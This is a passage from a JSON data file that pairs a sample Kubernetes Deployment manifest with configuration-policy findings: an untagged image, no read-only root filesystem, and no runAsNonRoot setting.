    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: k8sexamplesacr.azurecr.io/sampleapp\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"sampleapp\" is using an invalid container image, \"k8sexamplesacr.azurecr.io/sampleapp\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01667",
    "manifest_path": "data/manifests/the_stack_sample/sample_0563.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: k8sexamplesacr.azurecr.io/sampleapp\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sampleapp\" does not have a read-only root file system"
  },
  {
    "id": "01668",
    "manifest_path": "data/manifests/the_stack_sample/sample_0563.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sampleapp\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sampleapp\n  template:\n    metadata:\n      labels:\n        app: sampleapp\n    spec:\n      containers:\n      - name: sampleapp\n        image: k8sexamplesacr.azurecr.io/sampleapp\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sampleapp\" is not set to runAsNonRoot"
  }
]